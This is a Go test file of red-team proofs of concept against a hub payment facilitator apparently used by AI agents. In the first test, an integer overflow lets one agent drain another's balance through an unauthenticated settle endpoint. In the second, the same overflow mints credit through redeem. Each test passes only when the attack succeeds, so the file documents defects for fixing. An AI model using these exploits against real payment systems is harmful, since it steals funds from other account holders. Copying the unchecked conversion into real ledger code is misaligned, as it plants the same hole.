package aghub_test

// Red-team PoCs for SI-9 (payment) at the hub facilitator.
// Each test asserts that the ATTACK SUCCEEDS: a passing test means the
// defect is present.

import (
	"net/http"
	"testing"

	"github.com/ANetResearch/ANetCore/identity"
	"github.com/ANetResearch/ANetCore/payment"
)

// An authorization's Amount is a uint64 that the hub converts with
// int64(auth.Amount) everywhere it touches the ledger. An amount above
// MaxInt64 becomes negative: the balance check `bal < int64(amount)`
// passes for an empty account, the payer's balance is "debited" by a
// negative number (it grows) and the payee's is "credited" by a negative
// number (it shrinks). Any registered agent can therefore take credit out
// of any other account on the hub with an authorization signed only by
// itself, posted to the unauthenticated /x402/settle.
func TestRedteamSI9_SettleNegativeAmountDrainsVictim(t *testing.T) {
	srv := newHub(t)
	attacker, victim := twoAgents(t)
	register(t, srv, attacker, "Attacker", nil)
	register(t, srv, victim, "Victim", nil)
	hub := hubAIDOf(t, srv)
	own := payment.CreditNetwork(hub)
	fundAgent(t, srv, victim.AID(), 5000)

	const steal = 5000
	amount := ^uint64(0) - steal + 1 // int64(amount) == -5000
	before := balances(t, srv, attacker.AID(), victim.AID())

	a := signedAuth(t, attacker, victim.AID(), amount, hub, "")
	p := creditPayload(t, a, victim.AID(), own)
	// The requirements are the caller's to write: /x402/settle is open.
	req := requirementsFor(victim.AID(), 0, own)
	code, sr := settleCall(t, srv, p, req)
	if code != http.StatusOK || !sr.Success {
		t.Fatalf("attack did not settle: %d %+v", code, sr)
	}
	after := balances(t, srv, attacker.AID(), victim.AID())
	if after[0]-before[0] != steal || before[1]-after[1] != steal {
		t.Fatalf("expected attacker +%d, victim -%d; got %v -> %v", steal, steal, before, after)
	}
	t.Logf("ATTACK OK: attacker %d -> %d, victim %d -> %d (victim signed nothing)",
		before[0], after[0], before[1], after[1])
}

// The same overflow with the hub as payee (a "payment to the hub", which
// is how /x402/redeem is modelled) mints credit for the payer out of the
// hub's supply row, with no operator grant.
func TestRedteamSI9_RedeemNegativeAmountMints(t *testing.T) {
	srv := newHub(t)
	attacker, _ := twoAgents(t)
	register(t, srv, attacker, "Attacker", nil)
	hub := hubAIDOf(t, srv)
	own := payment.CreditNetwork(hub)

	const mint = 1_000_000
	amount := ^uint64(0) - mint + 1
	before := balanceOf(t, srv, attacker.AID())
	a := signedAuth(t, attacker, hub, amount, hub, "redeem:x")
	p := creditPayload(t, a, hub, own)
	code, b := post(t, srv.URL+"/x402/redeem", map[string]any{
		"x402Version": payment.Version, "paymentPayload": p, "reference": "x"})
	if code != http.StatusOK {
		t.Fatalf("redeem refused: %d %s", code, b)
	}
	after := balanceOf(t, srv, attacker.AID())
	if after-before != mint {
		t.Fatalf("expected attacker +%d; got %d -> %d", mint, before, after)
	}
	t.Logf("ATTACK OK: redeem minted %d credits (%d -> %d)", mint, before, after)
}

var _ = identity.Incept
